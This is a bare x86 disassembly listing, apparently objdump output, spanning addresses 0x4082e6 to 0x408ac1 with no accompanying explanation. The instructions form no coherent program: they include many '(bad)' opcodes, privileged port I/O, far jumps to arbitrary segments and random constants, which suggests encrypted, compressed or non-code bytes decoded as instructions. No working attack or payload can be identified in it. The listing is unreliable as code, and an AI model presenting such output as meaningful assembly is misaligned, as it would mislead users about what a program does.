  4082e6:	sbb    DWORD PTR [ebx],ebx
  4082e8:	pop    eax
  4082e9:	in     al,dx
  4082ea:	cld    
  4082eb:	jb     0x4082d1
  4082ed:	aaa    
  4082ee:	in     eax,0x6d
  4082f0:	sbb    al,0x4
  4082f2:	dec    esp
  4082f3:	jg     0x408374
  4082f5:	retf   
  4082f6:	shr    esi,1
  4082f8:	cmp    al,0x2
  4082fa:	add    bh,ah
  4082fc:	cs cld 
  4082fe:	popf   
  4082ff:	adc    al,0x28
  408301:	sub    DWORD PTR [ebp-0x21289e39],0xffffff9d
  408308:	sub    edx,DWORD PTR [edi-0x4]
  40830b:	pop    es
  40830c:	cli    
  40830d:	jecxz  0x40829c
  40830f:	pop    edx
  408310:	xchg   al,ah
  408312:	arpl   bx,ax
  408314:	push   0xffffffdb
  408316:	bound  ecx,QWORD PTR [ebp+0x49bd9ce1]
  40831c:	cld    
  40831d:	inc    ebp
  40831e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40831f:	and    ebx,DWORD PTR [esp+0x49489664]
  408326:	sub    DWORD PTR [edi+0x4f91b16c],edi
  40832c:	and    al,0xb1
  40832e:	xchg   edi,eax
  40832f:	sbb    ecx,DWORD PTR [edx+0x675d7ad9]
  408335:	jg     0x408369
  408337:	cmc    
  408338:	mov    edx,0x66799030
  40833d:	push   edx
  40833e:	aam    0x41
  408340:	pavgb  mm4,QWORD PTR [ecx]
  408343:	pop    fs
  408345:	xchg   ecx,eax
  408346:	pop    edx
  408347:	into   
  408348:	out    dx,al
  408349:	fisttp QWORD PTR [eax-0x7a]
  40834c:	aam    0x72
  40834e:	aad    0xeb
  408350:	push   esi
  408351:	icebp  
  408352:	mov    bh,0x79
  408354:	adc    eax,0x523fd38
  408359:	daa    
  40835a:	push   esi
  40835b:	cdq    
  40835c:	gs or  al,0x7a
  40835f:	imul   esi,DWORD PTR [edi],0x448f75ad
  408365:	xor    dl,BYTE PTR [edx+0x7b151a82]
  40836b:	jg     0x4083dd
  40836d:	mov    ds:0x1f5f8564,al
  408372:	repnz push esp
  408374:	test   al,0x33
  408376:	or     edi,ebx
  408378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408379:	and    BYTE PTR [edi-0x13],0xab
  40837d:	mov    al,0x78
  40837f:	lock mov WORD PTR [esi],gs
  408382:	fist   DWORD PTR [eax]
  408384:	pop    esp
  408385:	jae    0x408335
  408387:	sahf   
  408388:	fdivr  DWORD PTR [ebp+0x6ba31b61]
  40838e:	std    
  40838f:	push   esp
  408390:	adc    ah,BYTE PTR [ecx-0x1f95ef2d]
  408396:	add    al,0xcd
  408398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408399:	les    ebp,FWORD PTR [edi]
  40839b:	dec    edi
  40839c:	shr    BYTE PTR [edi+0x645b209f],1
  4083a2:	mov    ds:0x4d65e5ea,eax
  4083a7:	mov    cl,bl
  4083a9:	test   eax,0x5e212197
  4083ae:	xor    al,0x21
  4083b0:	push   es
  4083b1:	xchg   edi,eax
  4083b2:	cmp    al,0x4e
  4083b4:	xor    al,0x4e
  4083b6:	jns    0x4083ed
  4083b8:	xchg   edx,eax
  4083b9:	das    
  4083ba:	push   esp
  4083bb:	mov    eax,ds:0xac035365
  4083c0:	(bad)  
  4083c1:	xor    esi,ebx
  4083c3:	leave  
  4083c4:	push   ecx
  4083c5:	mov    bh,0xc7
  4083c7:	loopne 0x408418
  4083c9:	xchg   esi,eax
  4083ca:	lea    ebp,[edx-0x31784511]
  4083d0:	push   esp
  4083d1:	sbb    BYTE PTR [ebx+0x76af3cd3],bh
  4083d7:	mov    esi,0xcf9d6b9b
  4083dc:	daa    
  4083dd:	sub    eax,0x1c83a841
  4083e2:	pop    edx
  4083e3:	xor    DWORD PTR [eax],ebp
  4083e5:	sti    
  4083e6:	inc    ebp
  4083e7:	xchg   ecx,eax
  4083e8:	fcom   DWORD PTR [edx-0x38]
  4083eb:	mov    BYTE PTR [edi+0x62],dh
  4083ee:	xchg   edi,eax
  4083ef:	mov    BYTE PTR [ebp-0x69],bl
  4083f2:	and    cl,BYTE PTR [ecx+0x57]
  4083f5:	xchg   edx,eax
  4083f6:	jmp    0x2849:0xfb8b4b90
  4083fd:	pop    esi
  4083fe:	mov    ds:0x37f1907d,al
  408403:	add    ch,BYTE PTR [eax+0xb]
  408406:	cwde   
  408407:	and    esp,0x2379ea49
  40840d:	fldenv [ebx-0x75692961]
  408413:	jle    0x408430
  408415:	or     dl,BYTE PTR [ebp-0x7a153c8c]
  40841b:	outs   dx,DWORD PTR ds:[esi]
  40841c:	out    0xf,al
  40841e:	scas   al,BYTE PTR es:[edi]
  40841f:	xchg   esp,eax
  408420:	ins    BYTE PTR es:[edi],dx
  408421:	out    0x4,eax
  408423:	repnz out dx,al
  408425:	or     eax,0xa88e05ab
  40842a:	inc    ebp
  40842b:	and    dl,BYTE PTR [ecx]
  40842d:	hlt    
  40842e:	push   0x5a
  408430:	sahf   
  408431:	enter  0xe785,0x52
  408435:	scas   eax,DWORD PTR es:[edi]
  408436:	mov    al,ds:0x6d73645a
  40843b:	mov    cs:0x773c8cab,al
  408441:	cwde   
  408442:	mov    ds:0x782bdda6,eax
  408447:	int3   
  408448:	arpl   ax,dx
  40844a:	xchg   edi,eax
  40844b:	sbb    ch,BYTE PTR [ecx+0x4eb02746]
  408451:	test   BYTE PTR [edi-0x2c],bl
  408454:	jge    0x408405
  408456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408457:	mov    esi,ecx
  408459:	test   BYTE PTR [edi+0x71b778f0],0x90
  408460:	xlat   BYTE PTR ds:[ebx]
  408461:	call   DWORD PTR [esi]
  408463:	ins    DWORD PTR es:[edi],dx
  408464:	das    
  408465:	xchg   ebx,eax
  408466:	jg     0x4084c2
  408468:	sbb    DWORD PTR [esi+0x6d],edx
  40846b:	dec    ebp
  40846c:	loope  0x4084c3
  40846e:	popa   
  40846f:	mov    esp,0xed94b893
  408474:	(bad)  
  408475:	push   eax
  408476:	sub    dl,BYTE PTR [ecx-0x58e034f1]
  40847c:	xor    eax,0xb6daaded
  408481:	jmp    0x63f4:0x3512aac5
  408488:	daa    
  408489:	jl     0x408487
  40848b:	repnz dec esi
  40848d:	jmp    0x7d55:0x4c0465f2
  408494:	outs   dx,DWORD PTR ds:[esi]
  408495:	xchg   esi,eax
  408496:	cdq    
  408497:	jmp    DWORD PTR [eax+eax*8]
  40849a:	xchg   ebx,eax
  40849b:	push   0xd77d687b
  4084a0:	(bad)  
  4084a1:	(bad)  
  4084a2:	aad    0xa7
  4084a4:	jns    0x408483
  4084a6:	arpl   sp,cx
  4084a8:	add    cl,BYTE PTR [edi-0x7a]
  4084ab:	xchg   esi,ebp
  4084ad:	daa    
  4084ae:	and    esi,ebp
  4084b0:	mov    ?,WORD PTR [eax]
  4084b2:	mov    esi,0xaca625b4
  4084b7:	sbb    al,0xa1
  4084b9:	popf   
  4084ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084bb:	lods   eax,DWORD PTR ds:[esi]
  4084bc:	mov    dl,0x5e
  4084be:	fstp   TBYTE PTR [edx+eax*2-0xe]
  4084c2:	pusha  
  4084c3:	repz sbb BYTE PTR [ebp-0x71],ah
  4084c7:	addr16 std 
  4084c9:	fstp   QWORD PTR ds:0xc4cd07ce
  4084cf:	sub    eax,ebx
  4084d1:	iret   
  4084d2:	enter  0x2bdc,0x1e
  4084d6:	daa    
  4084d7:	retf   0x789a
  4084da:	adc    al,0x2d
  4084dc:	dec    ebp
  4084dd:	push   edx
  4084de:	in     al,dx
  4084df:	sub    BYTE PTR [edx-0x57],ah
  4084e2:	xchg   esp,esi
  4084e4:	push   edi
  4084e5:	mov    cl,ah
  4084e7:	push   edx
  4084e8:	fs push ecx
  4084ea:	or     DWORD PTR fs:[edx-0x7f],0x72
  4084ef:	jne    0x408563
  4084f1:	sar    dl,1
  4084f3:	sub    ah,BYTE PTR [ebp-0x6482963f]
  4084f9:	cmp    DWORD PTR ds:[edi],0x55859022
  408500:	xchg   ebp,eax
  408501:	push   cs
  408502:	stos   DWORD PTR es:[edi],eax
  408503:	(bad)  
  408504:	xchg   edx,eax
  408505:	icebp  
  408506:	push   es
  408507:	daa    
  408508:	jecxz  0x4084c6
  40850a:	jno    0x408566
  40850c:	pop    ds
  40850d:	fldenv [esi]
  40850f:	cs inc ebp
  408511:	jge    0x40857b
  408513:	xchg   ebp,eax
  408514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408515:	add    eax,0xada49420
  40851a:	ja     0x4084ca
  40851c:	test   eax,0x49364100
  408521:	arpl   WORD PTR [eax-0x673fda79],sp
  408527:	push   cs
  408528:	(bad)  
  40852a:	mov    al,BYTE PTR [edx-0x4d]
  40852d:	sbb    ecx,DWORD PTR [edx+0xb]
  408530:	shr    bh,1
  408532:	gs test al,0x20
  408535:	pop    eax
  408536:	xchg   ecx,eax
  408537:	inc    ebp
  408538:	mov    esi,0x80e224eb
  40853d:	push   esp
  40853e:	pusha  
  40853f:	test   eax,0x82ee670e
  408544:	idiv   BYTE PTR [edi-0x11d7e294]
  40854a:	bound  ecx,QWORD PTR [esi]
  40854c:	cmp    eax,DWORD PTR [eax-0x14]
  40854f:	je     0x408527
  408551:	or     eax,0x7ec6e500
  408556:	mov    ebp,0xb3dbd87b
  40855b:	mov    ecx,0xb8dc473e
  408560:	xchg   ebx,eax
  408561:	loopne 0x4085cf
  408563:	jnp    0x4085ce
  408565:	das    
  408566:	mov    al,0x16
  408568:	cdq    
  408569:	out    dx,al
  40856a:	scas   al,BYTE PTR es:[edi]
  40856b:	add    BYTE PTR [eax+ebx*8+0x2b],0x42
  408570:	lods   eax,DWORD PTR ds:[esi]
  408571:	add    bh,dl
  408573:	dec    esi
  408574:	sub    DWORD PTR [eax],ebp
  408576:	add    ax,0x9812
  40857a:	stos   DWORD PTR es:[edi],eax
  40857b:	mov    ebx,0x55cc553
  408580:	inc    esp
  408581:	and    esp,ecx
  408583:	das    
  408584:	dec    edx
  408585:	fidiv  DWORD PTR [edi+0x3bc52693]
  40858b:	push   0x1355d35d
  408590:	mov    esp,0xbcf5cfac
  408595:	sub    ah,0x87
  408598:	rcl    DWORD PTR [ebp+ebx*8+0xeb5607e],1
  40859f:	idiv   BYTE PTR [edx+edi*8]
  4085a2:	js     0x40852c
  4085a4:	mov    cl,0x9f
  4085a6:	mov    ?,edi
  4085a8:	mov    ebx,DWORD PTR [esp+esi*2+0x22]
  4085ac:	or     al,0xbd
  4085ae:	mov    ds:0x4e647c0a,eax
  4085b3:	mov    esi,0xfeb4d128
  4085b9:	or     DWORD PTR [esi+0x5f4ea1c6],ebp
  4085bf:	sbb    dh,ah
  4085c1:	push   cs
  4085c2:	popa   
  4085c3:	dec    edx
  4085c4:	jg     0x4085ac
  4085c6:	xchg   edx,eax
  4085c7:	stos   DWORD PTR es:[edi],eax
  4085c8:	popf   
  4085c9:	adc    bh,BYTE PTR [edi]
  4085cb:	or     al,0xcc
  4085cd:	mov    ebx,0x918f0ee4
  4085d2:	xchg   esp,eax
  4085d3:	mov    edi,0x9c35c40d
  4085d8:	mov    esp,0x55a18431
  4085dd:	nop
  4085de:	call   0x6237:0x4d702dda
  4085e5:	ret    0xb080
  4085e8:	cwde   
  4085e9:	clc    
  4085ea:	dec    esi
  4085eb:	ins    DWORD PTR es:[edi],dx
  4085ec:	out    dx,al
  4085ed:	jno    0x408667
  4085ef:	(bad)  
  4085f0:	frstpm(287 only) 
  4085f2:	scas   al,BYTE PTR es:[edi]
  4085f3:	and    BYTE PTR fs:[edi+eiz*8],bh
  4085f7:	ret    0x9e3a
  4085fa:	mov    eax,ds:0xac6e6c8
  4085ff:	xchg   esi,eax
  408600:	mov    ebp,0xeadc96ee
  408605:	and    ecx,esp
  408607:	mov    bl,0x34
  408609:	mov    WORD PTR [ebp+0x51],fs
  40860c:	adc    bh,BYTE PTR ds:0xf1f881c9
  408612:	add    bl,BYTE PTR [edi+edx*2-0x2aa86ffc]
  408619:	outs   dx,DWORD PTR ds:[esi]
  40861a:	daa    
  40861b:	test   ebp,ebp
  40861d:	stos   BYTE PTR es:[edi],al
  40861e:	repnz mov WORD PTR [si+0x1fca],?
  408624:	mov    eax,0x779a9b30
  408629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40862a:	repz pop esi
  40862c:	das    
  40862d:	iret   
  40862e:	aam    0x45
  408630:	jmp    0x4085be
  408632:	in     eax,dx
  408633:	mov    ebx,cs
  408635:	push   edx
  408636:	xor    ebp,ebx
  408638:	lods   al,BYTE PTR ds:[esi]
  408639:	xchg   esi,eax
  40863a:	sub    eax,0xd3c3cb91
  40863f:	das    
  408640:	scas   eax,DWORD PTR es:[edi]
  408641:	fwait
  408642:	sbb    eax,0x5ebe27a7
  408647:	aas    
  408648:	dec    ebx
  408649:	ror    DWORD PTR [edi+0x1ffc0d55],1
  40864f:	mov    ah,0x1c
  408651:	int3   
  408652:	cmp    dh,dh
  408654:	jl     0x4085f4
  408656:	mov    al,ds:0x6175df21
  40865b:	jge    0x4086a6
  40865d:	jno    0x408627
  40865f:	in     al,0xea
  408661:	ret    0x7f3e
  408664:	mov    bh,0x86
  408666:	iret   
  408667:	int    0xa2
  408669:	loop   0x4086ab
  40866b:	sub    bh,BYTE PTR [eax-0x5978fc33]
  408671:	jbe    0x408618
  408673:	sbb    eax,0x4520c4c0
  408678:	inc    esi
  408679:	pop    ss
  40867a:	aaa    
  40867b:	shr    ch,0x66
  40867e:	cli    
  40867f:	outs   dx,BYTE PTR ds:[esi]
  408680:	sbb    cl,BYTE PTR [ebp-0x2b]
  408683:	mov    ds:0x2153f0c9,al
  408688:	sbb    al,0x1f
  40868a:	fnsave [ebp-0x318e5320]
  408690:	inc    esp
  408691:	xchg   edi,eax
  408692:	push   esi
  408693:	pop    edi
  408694:	leave  
  408695:	and    al,0xae
  408697:	daa    
  408698:	jge    0x4086c3
  40869a:	or     BYTE PTR [esi+0x70],bl
  40869d:	fidivr DWORD PTR [ecx+0x6a]
  4086a0:	scas   eax,DWORD PTR es:[edi]
  4086a1:	cmp    ah,0x6f
  4086a4:	and    ch,BYTE PTR [edi+ecx*4]
  4086a7:	push   ebx
  4086a8:	outs   dx,DWORD PTR ds:[esi]
  4086a9:	addr16 gs in al,0xd4
  4086ad:	mov    al,ds:0x79bf8071
  4086b2:	clc    
  4086b3:	ins    BYTE PTR es:[edi],dx
  4086b4:	fldenv [edx-0x34]
  4086b7:	out    dx,eax
  4086b8:	push   edi
  4086b9:	jno    0x40865a
  4086bb:	push   ds
  4086bc:	add    al,0xb0
  4086be:	push   ss
  4086bf:	xchg   DWORD PTR [ebx+0x2dfd3a76],eax
  4086c5:	(bad)  
  4086c6:	fld    TBYTE PTR ds:0x451c5c6b
  4086cc:	rcl    BYTE PTR [ecx],cl
  4086ce:	aaa    
  4086cf:	push   cs
  4086d0:	add    BYTE PTR [ebp-0x13],bl
  4086d3:	mov    dh,0x6e
  4086d5:	cmp    bl,BYTE PTR [eax+0x4e8cf9c7]
  4086db:	jp     0x408701
  4086dd:	mov    dl,0xde
  4086df:	inc    DWORD PTR [edi-0x2a]
  4086e2:	mov    ebp,0x20fe5909
  4086e7:	inc    edx
  4086e8:	adc    al,0xf6
  4086ea:	xor    BYTE PTR [ebx+0x7c009006],bl
  4086f0:	ja     0x4086d8
  4086f2:	mov    eax,0x556a68ff
  4086f7:	mov    eax,0xbd5f0d6f
  4086fc:	xor    eax,0x3649ef82
  408701:	adc    al,0xbc
  408703:	pop    eax
  408704:	mov    ch,0xe7
  408706:	cmp    DWORD PTR [eax+0x58],ecx
  408709:	sti    
  40870a:	lahf   
  40870b:	enter  0xa9ac,0x7a
  40870f:	pop    ds
  408710:	loope  0x40871d
  408712:	outs   dx,BYTE PTR ds:[esi]
  408713:	enter  0xe82d,0xf
  408717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408718:	mov    ebp,0x94525461
  40871d:	jo     0x408700
  40871f:	sbb    al,0x5f
  408721:	inc    ecx
  408722:	jg     0x40876f
  408724:	mov    esi,0x5e945dd4
  408729:	jle    0x408709
  40872b:	inc    edx
  40872c:	xor    eax,0xd889285b
  408731:	lahf   
  408732:	cmp    eax,0x68df4b45
  408737:	mov    al,ds:0x30945f9c
  40873c:	imul   edx,DWORD PTR [esi+esi*8],0xffffff88
  408740:	inc    esp
  408741:	mov    eax,ds:0xed247e26
  408746:	mov    esp,0x35ae8801
  40874b:	lea    ebx,[eax-0x32]
  40874e:	stos   BYTE PTR es:[edi],al
  40874f:	mov    ch,0x5e
  408751:	xchg   esp,eax
  408752:	rcr    BYTE PTR [ebp+0x17f00163],0x87
  408759:	cmp    BYTE PTR [edx+0x3a308c10],ah
  40875f:	xor    dh,ch
  408761:	in     al,dx
  408762:	ss aam 0x5c
  408765:	mov    bl,0x41
  408767:	loopne 0x40879c
  408769:	fsubr  st,st(2)
  40876b:	xchg   esp,eax
  40876c:	das    
  40876d:	and    eax,0x365947ce
  408772:	cmc    
  408773:	ds inc ebp
  408775:	inc    edx
  408776:	xchg   ebx,eax
  408777:	mov    gs,WORD PTR [ecx]
  408779:	jno    0x40877f
  40877b:	xor    esi,edi
  40877d:	push   es
  40877e:	sub    BYTE PTR [eax+0x4b],cl
  408781:	add    eax,0x5af6ea68
  408786:	push   ecx
  408787:	js     0x408729
  408789:	adc    cl,dh
  40878b:	adc    al,0xa0
  40878d:	(bad)  
  40878e:	das    
  40878f:	inc    al
  408791:	leave  
  408792:	fimul  DWORD PTR [esi]
  408794:	mov    WORD PTR [edi+0x6148b921],ss
  40879a:	inc    esp
  40879b:	aaa    
  40879c:	sub    BYTE PTR [ecx+0x3d7eb22a],cl
  4087a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087a3:	int3   
  4087a4:	cmp    eax,0xd9edf129
  4087a9:	mov    ss,WORD PTR [edx]
  4087ab:	outs   dx,DWORD PTR ds:[esi]
  4087ac:	aaa    
  4087ad:	and    DWORD PTR [esi+ecx*1],eax
  4087b0:	loope  0x408812
  4087b2:	sbb    al,0xc2
  4087b4:	repnz push 0xdb150123
  4087ba:	call   0xa105:0xa3c223cb
  4087c1:	loope  0x40874e
  4087c3:	out    0x28,al
  4087c5:	or     esp,esi
  4087c7:	xor    ebx,DWORD PTR [edi-0x771ad37e]
  4087cd:	les    ebx,FWORD PTR [ebp+eax*8-0x26f09aef]
  4087d4:	push   edx
  4087d5:	iret   
  4087d6:	jno    0x4087f9
  4087d8:	loop   0x40880e
  4087da:	xchg   esi,eax
  4087db:	sbb    al,0xe9
  4087dd:	xchg   DWORD PTR [ecx+0x689f1eb3],edx
  4087e3:	pop    esp
  4087e4:	outs   dx,BYTE PTR ds:[esi]
  4087e5:	push   es
  4087e6:	push   ss
  4087e7:	push   edx
  4087e8:	stos   DWORD PTR es:[edi],eax
  4087e9:	leave  
  4087ea:	sub    BYTE PTR [edx],cl
  4087ec:	sub    ah,BYTE PTR [esi]
  4087ee:	jmp    0x4585:0x42716938
  4087f5:	pop    edi
  4087f6:	dec    ecx
  4087f7:	jle    0x40878b
  4087f9:	lds    edi,FWORD PTR [edi]
  4087fb:	rcl    DWORD PTR [eax+0x5c],1
  4087fe:	gs dec edx
  408800:	jl     0x408873
  408802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408803:	jecxz  0x4087fc
  408805:	inc    esp
  408806:	scas   eax,DWORD PTR es:[edi]
  408807:	mov    eax,ds:0xd013e6ac
  40880c:	(bad)  
  40880d:	aad    0x1c
  40880f:	cmp    al,0xf3
  408811:	inc    eax
  408812:	mov    eax,0xbfb2d78c
  408817:	mov    ch,0xe5
  408819:	and    eax,0x7e7bec7c
  40881e:	popf   
  40881f:	arpl   WORD PTR ss:[edx+ecx*1],bp
  408823:	push   0x61
  408825:	pop    ds
  408826:	or     DWORD PTR [ecx],0x7901fe4f
  40882c:	mov    bh,0x7f
  40882e:	and    eax,0xde4da5b
  408833:	xchg   BYTE PTR [edx-0x10619e1a],dl
  408839:	cmp    dh,BYTE PTR [edx-0x76]
  40883c:	add    ebx,DWORD PTR [ebx+0x211fa895]
  408842:	mov    ds:0x33a903ca,eax
  408847:	adc    DWORD PTR [ebp+ebx*1-0x6919de6a],edx
  40884e:	aas    
  40884f:	pop    edi
  408850:	rcl    DWORD PTR [eax+0x25],0xc2
  408854:	jne    0x4088a7
  408856:	les    eax,FWORD PTR [ecx+0x5e]
  408859:	adc    ebx,DWORD PTR [ebp-0x2a]
  40885c:	fldcw  WORD PTR [ebx]
  40885e:	mov    edi,DWORD PTR [ecx]
  408860:	jle    0x408880
  408862:	test   DWORD PTR [eax+0x28],eax
  408865:	mov    al,ds:0x7dfa8589
  40886a:	fwait
  40886b:	outs   dx,BYTE PTR ds:[esi]
  40886c:	sub    BYTE PTR [ecx+0x74c0f479],bl
  408872:	mov    ah,0x32
  408874:	and    esi,DWORD PTR [edi+esi*1+0x48f20dba]
  40887b:	out    0x4b,eax
  40887d:	xchg   DWORD PTR [edi],ecx
  40887f:	arpl   WORD PTR [ecx+0x57bf3fe5],dx
  408885:	sti    
  408886:	cs pop edx
  408888:	xor    eax,0xb664223e
  40888d:	loopne 0x4088ca
  40888f:	xchg   edi,eax
  408890:	or     dh,BYTE PTR [ebx+0x16567a91]
  408896:	xchg   edi,eax
  408897:	cs inc edx
  408899:	cmp    eax,0x3bfa8a4e
  40889e:	xor    DWORD PTR [ebp+ecx*2-0x6b69d88d],ebp
  4088a5:	and    dh,BYTE PTR [edx+0x49e1f46b]
  4088ab:	xchg   edi,eax
  4088ac:	mov    ah,0xa9
  4088ae:	loopne 0x40888b
  4088b0:	(bad)  
  4088b1:	ja     0x408840
  4088b3:	lahf   
  4088b4:	sbb    dl,BYTE PTR [edx]
  4088b6:	sub    BYTE PTR ds:0x3f6950dd,dh
  4088bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088bd:	in     eax,0x63
  4088bf:	mov    ah,0x31
  4088c1:	sub    DWORD PTR [eax+0x50],edi
  4088c4:	dec    esp
  4088c5:	call   0xda63:0x14bd16c
  4088cc:	jo     0x40886e
  4088ce:	jbe    0x40890e
  4088d0:	enter  0x2e77,0x47
  4088d4:	jp     0x40891e
  4088d6:	sbb    al,0xc5
  4088d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088d9:	pop    eax
  4088da:	or     bl,BYTE PTR [eax+0x7f397f25]
  4088e0:	leave  
  4088e1:	shl    BYTE PTR [edi-0x7a247433],1
  4088e7:	fld    DWORD PTR [ebx+0x77]
  4088ea:	popf   
  4088eb:	sar    DWORD PTR [ecx-0x2968e382],cl
  4088f1:	and    dl,BYTE PTR ds:0x6041f5a2
  4088f7:	xor    al,0xa3
  4088f9:	les    ecx,FWORD PTR [bx+di+0x78]
  4088fd:	push   ecx
  4088fe:	xlat   BYTE PTR ds:[ebx]
  4088ff:	out    dx,eax
  408900:	adc    cl,bh
  408902:	pusha  
  408903:	dec    esp
  408904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408905:	loopne 0x4088d1
  408907:	inc    ecx
  408908:	(bad)  
  408909:	xchg   esp,eax
  40890a:	and    eax,edi
  40890c:	pop    ecx
  40890d:	or     ebp,DWORD PTR [ebx-0x2d]
  408910:	adc    cl,0x13
  408913:	sbb    esp,DWORD PTR [ebx]
  408915:	stc    
  408916:	das    
  408917:	ror    bh,0x1c
  40891a:	(bad)  [esi+esi*2]
  40891d:	aaa    
  40891e:	or     eax,0xba2ca690
  408923:	rcl    ebx,cl
  408925:	fdiv   DWORD PTR [ecx]
  408927:	sti    
  408928:	(bad)  
  40892a:	inc    ebp
  40892b:	sbb    DWORD PTR [edi+0x661cb3ed],ecx
  408931:	je     0x40891c
  408933:	mov    esp,0x648704d6
  408938:	cld    
  408939:	xor    BYTE PTR [ebp-0xba8bde7],dh
  40893f:	rol    BYTE PTR [esi+edx*4],0x9c
  408943:	or     BYTE PTR [esi],0x61
  408946:	cwde   
  408947:	retf   
  408948:	pusha  
  408949:	call   0x987d:0xebd37db0
  408950:	(bad)  
  408951:	loopne 0x4089c8
  408953:	ja     0x408958
  408955:	mov    al,0x8f
  408957:	ds pop esi
  408959:	and    BYTE PTR [edx],ch
  40895b:	lods   eax,DWORD PTR ds:[esi]
  40895c:	dec    ecx
  40895d:	mov    esi,0x15861616
  408962:	or     esi,DWORD PTR [edi]
  408964:	push   eax
  408965:	ret    
  408966:	pushf  
  408967:	mov    ebp,0x5dfb6aad
  40896c:	je     0x408949
  40896e:	ret    
  40896f:	adc    BYTE PTR [bx+si],ch
  408972:	in     al,dx
  408973:	or     eax,0xdb57783d
  408978:	add    al,0xa0
  40897a:	lods   eax,DWORD PTR cs:[esi]
  40897c:	pop    ebx
  40897d:	in     al,dx
  40897e:	lock push ss
  408980:	fild   WORD PTR [esi]
  408982:	mov    bl,0xa7
  408984:	sub    ah,BYTE PTR [ebp+0x13]
  408987:	dec    edx
  408988:	push   0xffffffa4
  40898a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40898b:	mov    ebp,0x39a7a749
  408990:	out    dx,al
  408991:	mov    dl,0x3b
  408993:	mov    esi,0xe1efb0cc
  408998:	outs   dx,DWORD PTR ds:[esi]
  408999:	jp     0x408934
  40899b:	clc    
  40899c:	sub    al,0xe5
  40899e:	popa   
  40899f:	repnz dec edi
  4089a1:	test   eax,0x4b611bf2
  4089a6:	loopne 0x408935
  4089a8:	sub    ch,al
  4089aa:	adc    dl,BYTE PTR [ecx+0x74]
  4089ad:	fcom   DWORD PTR [edi]
  4089af:	stos   DWORD PTR es:[edi],eax
  4089b0:	push   DWORD PTR cs:[ecx]
  4089b3:	in     al,dx
  4089b4:	jecxz  0x4089bd
  4089b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089b7:	adc    al,BYTE PTR [ecx]
  4089b9:	mov    ax,0xab0c
  4089bd:	jns    0x408a1a
  4089bf:	in     al,0xb1
  4089c1:	sbb    al,0xf
  4089c3:	stos   BYTE PTR es:[edi],al
  4089c4:	test   al,0x55
  4089c6:	sub    esi,DWORD PTR [ebp-0x5a082e06]
  4089cc:	outs   dx,BYTE PTR ds:[esi]
  4089cd:	es std 
  4089cf:	and    al,0xf9
  4089d1:	lock ins DWORD PTR es:[edi],dx
  4089d3:	jl     0x408981
  4089d5:	push   esp
  4089d6:	stc    
  4089d7:	ins    BYTE PTR es:[edi],dx
  4089d8:	sti    
  4089d9:	and    ch,BYTE PTR [ebp-0x29]
  4089dc:	pushf  
  4089dd:	cli    
  4089de:	sub    DWORD PTR [ebp-0x2131f5b0],ebp
  4089e4:	dec    edx
  4089e5:	pop    edi
  4089e6:	dec    ebx
  4089e7:	mov    ch,0x13
  4089e9:	and    al,0x79
  4089eb:	lock pusha 
  4089ed:	call   0xbc3cf33b
  4089f2:	(bad)  
  4089f3:	cs sbb dl,dl
  4089f6:	mov    DWORD PTR [ecx+0x45],esi
  4089f9:	jle    0x408a32
  4089fb:	mov    dl,0xc9
  4089fd:	lea    eax,[edi-0x58316148]
  408a03:	push   edx
  408a04:	mov    esi,0x97fe01cc
  408a09:	cdq    
  408a0a:	add    dl,0x79
  408a0d:	lods   al,BYTE PTR ds:[esi]
  408a0e:	jmp    FWORD PTR [ebp+0x69]
  408a11:	mov    esi,0x862b28ab
  408a16:	push   eax
  408a17:	and    al,0xf6
  408a19:	push   es
  408a1a:	xchg   edi,eax
  408a1b:	mov    ch,0x24
  408a1d:	aad    0xf5
  408a1f:	repz add BYTE PTR [eax],ch
  408a22:	push   ebx
  408a23:	and    BYTE PTR [edi+0x3c0aa8dc],ch
  408a29:	in     al,0x98
  408a2b:	add    esp,DWORD PTR [ebx+edi*8+0x3b3df1d2]
  408a32:	sub    DWORD PTR [edi*4+0x52e965e],eax
  408a39:	cld    
  408a3a:	int3   
  408a3b:	scas   eax,DWORD PTR es:[edi]
  408a3c:	jp     0x4089d2
  408a3e:	lar    eax,WORD PTR [esi-0x56ec4877]
  408a45:	sbb    eax,DWORD PTR [edx-0x452cfb8f]
  408a4b:	stc    
  408a4c:	push   eax
  408a4d:	or     eax,0xa16fabca
  408a52:	sar    BYTE PTR ds:0x51d8e653,cl
  408a58:	repz clc 
  408a5a:	add    DWORD PTR [ebx-0x5d],ebx
  408a5d:	and    al,0x2f
  408a5f:	sub    edi,DWORD PTR [edi-0x25]
  408a62:	ja     0x408ad7
  408a64:	jecxz  0x408ac7
  408a66:	gs out 0x2d,al
  408a69:	es jnp 0x408a59
  408a6c:	jb     0x408a37
  408a6e:	rcl    ecx,0x34
  408a71:	add    dh,BYTE PTR [edi-0x7d2145c4]
  408a77:	push   ds
  408a78:	call   0x69b72d8a
  408a7d:	jns    0x408aeb
  408a7f:	pop    esp
  408a80:	sbb    dh,cl
  408a82:	cmp    al,0x68
  408a84:	das    
  408a85:	sar    BYTE PTR [ebx+0x7b],1
  408a88:	mov    DWORD PTR [esi],0x266fe840
  408a8e:	out    0x60,al
  408a90:	test   DWORD PTR [ebx-0x4e],0x7916c7d5
  408a97:	push   0x1b
  408a99:	fisubr WORD PTR [ebx+0x6fba2fe0]
  408a9f:	adc    eax,0x716833ff
  408aa4:	jae    0x408ab2
  408aa6:	mov    DWORD PTR [esi],ecx
  408aa8:	push   ebp
  408aa9:	jmp    0xe840a582
  408aae:	push   0xe7e79de8
  408ab3:	fimul  WORD PTR es:[esi+0x31ceba02]
  408aba:	adc    eax,0xd6681905
  408abf:	(bad)  
  408ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ac1:	int    0xea
